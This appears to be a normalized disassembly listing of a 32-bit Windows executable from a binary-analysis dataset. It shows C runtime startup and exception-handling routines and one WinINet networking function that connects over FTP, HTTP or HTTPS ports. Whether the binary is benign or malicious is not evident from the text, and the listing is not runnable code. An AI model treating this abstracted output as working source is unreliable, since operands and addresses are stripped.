mov edi [ esp + 0x1420 ]
test edi edi
jne r-xdata
lea eax [ esp + 0x418 ]
lea edx [ eax + 0x1 ]
mov eax edi
lea eax [ esp + 0x818 ]
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea eax [ esp + 0x818 ]
jne r-xdata
lea esi [ esp + 0x418 ]
mov ecx [ esp + 0x1428 ]
mov edx [ ebx ]
mov edx [ edx + 0x4 ]
push ecx
push ebp
push esi
push eax
mov eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x102c ]
push ecx
mov ecx ebx
call edx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1408
retn 0x10
sub_404bc0
push ebp
mov ebp esp
push 0xffffffff
push sub_4058e0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov eax [ ebp + 0x1c ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x0
push 0x0
push 0x0
push 0x0
mov esi ecx
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x11 ] 0x1
mov [ ebp - 0x4 ] 0x0
call [ InternetOpenA@IAT ]
mov [ esi + 0x410 ] eax
test eax eax
je r-xdata
push r--data
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x24 ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp + 0x18 ]
sub ecx 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
sub ecx 0x1
je r-xdata
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
push 0x0
push 0x8000000
push 0x1
push ebx
push edi
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
push eax
call [ InternetConnectA@IAT ]
mov [ esi + 0x414 ] eax
jmp r-xdata
mov ecx 0x15
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
mov eax [ esi + 0x414 ]
test eax eax
je r-xdata
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x3
push ebx
push edi
push ecx
push edx
push eax
call [ InternetConnectA@IAT ]
mov [ esi + 0x414 ] eax
jmp r-xdata
mov ecx 0x50
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call _CxxThrowException
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
push 0x0
push 0x0
push 0x3
push ebx
push edi
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
push eax
call [ InternetConnectA@IAT ]
mov [ esi + 0x414 ] eax
jmp r-xdata
mov ecx 0x1bb
push 0x0
call [ InternetAttemptConnect@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x420 ]
push r--data
lea edx [ ebp - 0x1c ]
push edx
mov [ ebp - 0x1c ] r--data
call _CxxThrowException
mov al [ ecx ]
mov [ edx ] al
inc ecx
inc edx
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov [ esi + 0x42c ] eax
mov eax [ ebp + 0x18 ]
sub eax 0x0
je r-xdata
test ebx ebx
je r-xdata
mov edx [ esi + 0x424 ]
mov ecx edi
mov [ esi + 0x42c ] 0x15
jmp r-xdata
sub eax 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
mov al [ ebp - 0x11 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov esi [ esi + 0x428 ]
mov ecx ebx
lea esp [ esp ]
mov al [ ecx ]
mov [ edx ] al
inc ecx
inc edx
test al al
jne r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x430 ] eax
test edi edi
je r-xdata
mov [ esi + 0x42c ] 0x50
jmp r-xdata
sub eax 0x1
jne r-xdata
mov al [ ecx ]
mov [ esi ] al
inc ecx
inc esi
test al al
jne r-xdata
mov [ esi + 0x42c ] 0x1bb
jmp r-xdata
sub_404e1a
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x2
push edi
mov edi ecx
je r-xdata
call ?_type_info_dtor_internal_method@type_info@@QAEXXZ
test [ ebp + 0x8 ] 0x1
je r-xdata
push esi
push ?_type_info_dtor_internal_method@type_info@@QAEXXZ
lea esi [ edi - 0x4 ]
push [ esi ]
push 0xc
push edi
call sub_4052a1
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax edi
push edi
call ??3@YAXPAX@Z
pop ecx
mov eax esi
pop esi
jmp r-xdata
push esi
call ??3@YAXPAX@Z
pop ecx
pop edi
pop ebp
retn 0x4
sub_404e90
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_404f2e
push sub_40543c
call sub_4053ff
mov eax [ rw-data ]
mov [ esp ] rw-data
push [ rw-data ]
mov [ rw-data ] eax
push rw-data
push rw-data
push rw-data
call [ __getmainargs@IAT ]
add esp 0x14
mov [ rw-data ] eax
test eax eax
jge r-xdata
retn
push 0x8
call _amsg_exit
pop ecx
sub_404f79
push 0x58
push r--data
call sub_4055cc
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x4 ] 0x1
mov eax [ fs : 0x18 ]
mov esi [ eax + 0x4 ]
mov edi rw-data
xor esi esi
inc esi
cmp eax esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x1f
call _amsg_exit
pop ecx
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
xor esi esi
inc esi
mov ebx esi
jmp r-xdata
mov [ rw-data ] esi
mov [ rw-data ] esi
push r--data
push r--data
call _initterm_e
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
push 0x0
push esi
push edi
call [ InterlockedCompareExchange@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
jne r-xdata
test ebx ebx
jne r-xdata
push r--data
push r--data
call _initterm
pop ecx
pop ecx
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push ebx
push edi
call [ InterlockedExchange@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax 0xff
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
push rw-data
call sub_405500
pop ecx
test eax eax
je r-xdata
cmp al 0x22
jne r-xdata
test al al
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
movzx eax al
push eax
call [ _ismbblead@IAT ]
pop ecx
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x1c ] ecx
sete cl
mov [ ebp - 0x1c ] ecx
mov al [ esi ]
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
inc esi
jmp r-xdata
inc esi
mov [ ebp - 0x20 ] esi
test [ ebp - 0x3c ] 0x1
je r-xdata
cmp al 0x20
ja r-xdata
mov [ ebp - 0x20 ] esi
mov al [ esi ]
cmp al 0x20
ja r-xdata
push 0xa
pop eax
movzx eax [ ebp - 0x38 ]
jmp r-xdata
inc esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push eax
call [ exit@IAT ]
push eax
push esi
push 0x0
push __dos_header
call sub_4036f0
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ rw-data ]
jmp r-xdata
call [ _cexit@IAT ]
call sub_405611
retn
sub_405158
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
mov eax [ r--data ]
lea eax [ eax + __dos_header ]
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
jmp r-xdata
movzx ecx [ eax + 0x18 ]
cmp ecx 0x10b
je r-xdata
push 0x2
mov [ rw-data ] eax
call [ __set_app_type@IAT ]
push 0xffffffff
call [ _encode_pointer@IAT ]
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] eax
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_405416
call sub_405675
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ eax + 0x74 ] 0xe
jbe r-xdata
cmp ecx 0x20b
jne r-xdata
call sub_40564a
cmp [ rw-data ] 0xffffffff
jne r-xdata
push sub_405675
call [ __setusermatherr@IAT ]
pop ecx
xor ecx ecx
cmp [ eax + 0xe8 ] ecx
cmp [ eax + 0x84 ] 0xe
jbe r-xdata
xor eax eax
retn
push 0xffffffff
call [ _configthreadlocale@IAT ]
pop ecx
xor ecx ecx
cmp [ eax + 0xf8 ] ecx
jmp r-xdata
setne cl
mov eax ecx
sub_405243
push 0x14
push r--data
call sub_4055cc
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405611
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_405266
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call ?terminate@@YAXXZ
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405611
retn 0x10
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_4052a1
push 0xc
push r--data
call sub_4055cc
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4052ec
call sub_405611
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_405304
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call ?terminate@@YAXXZ
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_40535a
push 0x14
push r--data
call sub_4055cc
push [ rw-data ]
mov esi [ _decode_pointer@IAT ]
call esi
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x8
call _lock
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
call esi
mov [ ebp - 0x1c ] eax
push [ rw-data ]
call esi
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
mov esi [ _encode_pointer@IAT ]
call esi
pop ecx
push eax
call __dllonexit
mov [ ebp - 0x24 ] eax
push [ ebp - 0x1c ]
call esi
mov [ rw-data ] eax
push [ ebp - 0x20 ]
call esi
add esp 0x14
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4053f6
mov eax [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call [ _onexit@IAT ]
pop ecx
jmp r-xdata
call sub_405611
retn
sub_405416
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40543c
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_405470
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_4054b0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_405500
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_405625
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_405470
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_4054b0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4055cc
push sub_405625
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_405625
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_40572c
push rw-data
call _except_handler4_common
add esp 0x18
pop ebp
retn
sub_40564a
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call _controlfp_s
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call _invoke_watson
add esp 0x14
sub_405678
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_40574e
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call _crt_debugger_hook
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call _crt_debugger_hook
pop ecx
sub_401000
push esi
mov esi ecx
call sub_402830
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_401020
mov [ ecx ] r--data
jmp sub_402880
sub_4024c0
mov eax ecx
retn
sub_4024d0
mov ecx [ esp + 0x4 ]
movzx edx [ esp + 0x6 ]
movzx eax cl
shl eax 0x8
movzx ecx ch
add eax ecx
movzx ecx [ esp + 0x7 ]
shl eax 0x8
add eax edx
shl eax 0x8
add eax ecx
retn 0x4
sub_402880
mov [ ecx ] r--data
retn
sub_402aa0
mov al 0x1
retn 0x4
sub_402df0
mov al 0x1
retn
sub_402e00
xor eax eax
retn
sub_402e10
xor eax eax
retn 0x4
sub_402e20
mov al 0x1
retn 0x8
sub_403260
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push edx
mov edx [ ecx + 0x88 ]
push eax
push edx
call sub_402bf0
retn 0xc
sub_403280
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push edx
mov edx [ ecx + 0x8c ]
push eax
push edx
call sub_402bf0
retn 0xc
sub_4038f0
mov esi [ ebp - 0x18 ]
mov eax [ esi + 0x418 ]
push eax
call [ InternetCloseHandle@IAT ]
mov [ esi + 0x418 ] 0x0
mov eax sub_403910
retn
sub_403910
mov al [ ebp - 0x11 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_403926
mov esi [ ebp - 0x18 ]
mov ecx [ esi + 0x418 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov [ esi + 0x418 ] 0x0
mov eax sub_403910
retn
sub_403ac0
retn 0x8
sub_403ad0
xor eax eax
retn 0x8
sub_4045fd
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x418 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov [ esi + 0x418 ] 0x0
mov eax r-xdata
retn
sub_4049c0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x40c ] edx
retn 0x8
sprintf
jmp [ sprintf@IAT ]
memset
jmp [ memset@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
strstr
jmp [ strstr@IAT ]
_time64
jmp [ _time64@IAT ]
atoi
jmp [ atoi@IAT ]
asctime_s
jmp [ asctime_s@IAT ]
_localtime64_s
jmp [ _localtime64_s@IAT ]
atof
jmp [ atof@IAT ]
printf
jmp [ printf@IAT ]
memcpy
jmp [ memcpy@IAT ]
rand
jmp [ rand@IAT ]
srand
jmp [ srand@IAT ]
__CxxFrameHandler3
jmp [ __CxxFrameHandler3@IAT ]
_mbschr
jmp [ _mbschr@IAT ]
sscanf
jmp [ sscanf@IAT ]
malloc
jmp [ malloc@IAT ]
_splitpath
jmp [ _splitpath@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
atol
jmp [ atol@IAT ]
strncpy
jmp [ strncpy@IAT ]
strncmp
jmp [ strncmp@IAT ]
sub_4050f3
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call _XcptFilter
pop ecx
pop ecx
retn
sub_40513f
xor eax eax
inc eax
retn
_start
call sub_405678
jmp sub_404f79
sub_4052ec
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405243
sub_405346
push sub_405304
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
_amsg_exit
jmp [ _amsg_exit@IAT ]
sub_4053f6
push 0x8
call _unlock
pop ecx
retn
sub_4053ff
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40535a
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
_XcptFilter
jmp [ _XcptFilter@IAT ]
sub_40558b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
_initterm
jmp [ _initterm@IAT ]
_initterm_e
jmp [ _initterm_e@IAT ]
sub_405611
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_405675
xor eax eax
retn
?terminate@@YAXXZ
jmp [ terminate@IAT ]
?_type_info_dtor_internal_method@type_info@@QAEXXZ
jmp [ type_info::_type_info_dtor_internal_method@IAT ]
_unlock
jmp [ _unlock@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_lock
jmp [ _lock@IAT ]
sub_40572c
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_40574e
retn
_except_handler4_common
jmp [ _except_handler4_common@IAT ]
_invoke_watson
jmp [ _invoke_watson@IAT ]
_controlfp_s
jmp [ _controlfp_s@IAT ]
_crt_debugger_hook
jmp [ _crt_debugger_hook@IAT ]
sub_405860
lea ecx [ ebp + 0x4 ]
jmp sub_4014a0
sub_405868
mov eax r--data
jmp __CxxFrameHandler3
sub_405880
mov eax [ ebp - 0x18 ]
push eax
call ??3@YAXPAX@Z
pop ecx
retn
sub_40588b
mov eax r--data
jmp __CxxFrameHandler3
sub_4058a0
lea ecx [ ebp - 0xd ]
jmp sub_4014a0
sub_4058a8
mov eax r--data
jmp __CxxFrameHandler3
sub_4058c0
mov eax r--data
jmp __CxxFrameHandler3
sub_4058d0
mov eax r--data
jmp __CxxFrameHandler3
sub_4058e0
mov eax r--data
jmp __CxxFrameHandler3
